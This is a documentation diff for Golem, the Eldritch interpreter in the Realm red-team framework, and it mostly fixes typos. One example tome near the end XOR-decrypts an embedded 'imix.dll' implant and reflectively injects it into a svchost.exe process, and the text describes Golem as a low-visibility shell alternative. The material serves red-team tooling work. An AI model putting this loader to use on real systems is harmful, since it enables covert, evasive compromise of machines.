@@ -8,7 +8,7 @@ permalink: user-guide/golem
 ## What is Golem
 
 Golem is the standalone interpreter for Eldritch.
-This program exists to help users get experience with the Eldritch language as well as a jumping off point if you're interested in implementing your own program using the Eldritch language. Additionally, consult our [Tomes](/user-guide/tomes) documentation for information about packaging [Eldritch](/user-guide/terminology#eldritch) code for use with [Imix](/user-guide/imix) and Tavern.
+This program exists to help users get experience with the Eldritch language as well as a jumping-off point if you're interested in implementing your own program using the Eldritch language. Additionally, consult our [Tomes](/user-guide/tomes) documentation for information about packaging [Eldritch](/user-guide/terminology#eldritch) code for use with [Imix](/user-guide/imix) and Tavern.
 
 Golem can also be used operationally as an alternative to a system native shell.
 You can leverage the power of Eldritch with minimal exposure in the system process tree.
@@ -20,7 +20,7 @@ git clone git@github.com:spellshift/realm.git
 cd realm/implants/golem
 git checkout -b latest $(git tag | tail -1) # Checkout the latest stable releases
 
-# Launch and interactive REPL
+# Launch an interactive REPL
 cargo run -- -i
 
 # Or run a tome on disk
@@ -47,7 +47,7 @@ Copy an existing tome and rename it to your desired name.
 [./tomes]$ cp -r ./file_list ./new_tome
 ```
 
-This will setup the boiler plate.
+This will setup the boilerplate.
 A tome file structure should look like this:
 
 ```
@@ -72,7 +72,7 @@ name: List files # The name of your tome.
 description: List the files and directories found at the path # A description to help users understand what your tome does.
 author: hulto # Your Github username.
 support_model: FIRST_PARTY # Is this a tome that ships with Realm or not?
-tactic: RECON # Which MTIRE ATT&CK Tactic best describes this tome?
+tactic: RECON # Which MITRE ATT&CK Tactic best describes this tome?
 paramdefs: # A list of inputs the tome requires.
 - name: path # The name of the input parameter `input_params['path']`.
   type: string # The type of the input parameter.
@@ -84,7 +84,7 @@ paramdefs: # A list of inputs the tome requires.
 
 Eldritch while it looks like python is distinct and many features in python do not exist in Eldritch.
 
-For an almost complete list of syntax checkout the starlark (DSL which Eldritch is based on) docs <https://bazel.build/rules/language>
+For an almost complete list of syntax checkout the Starlark (DSL which Eldritch is based on) docs <https://bazel.build/rules/language>
 *Note: The docs may be incorrect in some places as we're using the starlark-rust implementation which doesn't always adhere to the starlark spec.*
 
 ```python
@@ -113,7 +113,7 @@ def file_list(path):
 # Call our tomes function.
 file_list(input_params['path'])
 # `input_params` is a dictionary that's implicitly passed into the Eldritch runtime.
-# The key value pairs in input_params is defined by the users answers to the paramdefs in the UI.
+# The key value pairs in input_params is defined by the user's answers to the paramdefs in the UI.
 # For example if you specify `name: path` in your `metadata.yml` file the UI will ask the user for
 # a path and then populate the `path` key in `input_params` when the tome runs.
 # Input params is unique to each task so setting a var in one task won't affect others.
@@ -126,7 +126,7 @@ print("\n")
 Tomes are designed to accomplish specific workflows.
 Some small tomes have been created to accomplish basic sysadmin tasks like reading, writing files, checking processes etc.
 Ideally though if you have a specific workflow you'll define it as a tome.
-We want to avoid queueing multiple quests to accomplish a workflow.
+We want to avoid queuing multiple quests to accomplish a workflow.
 
 ### Testing your tome
 
@@ -178,8 +178,8 @@ main()
 
 ```python
 def decrypt(payload_bytes):
-    let res = []
-    for byte in in payload_bytes:
+    res = []
+    for byte in payload_bytes:
         res.push(byte ^ 6)
     return res
 
@@ -187,7 +187,7 @@ def main():
     if is_windows():
         for proc in process.list():
             if "svchost.exe" in proc['name']:
-                let enc_bytes = assets.read_bytes("imix.dll")
+                enc_bytes = assets.read_bytes("imix.dll")
                 sys.dll_reflect(decrypt(enc_bytes), proc['pid'], 'imix_main')
                 return
 
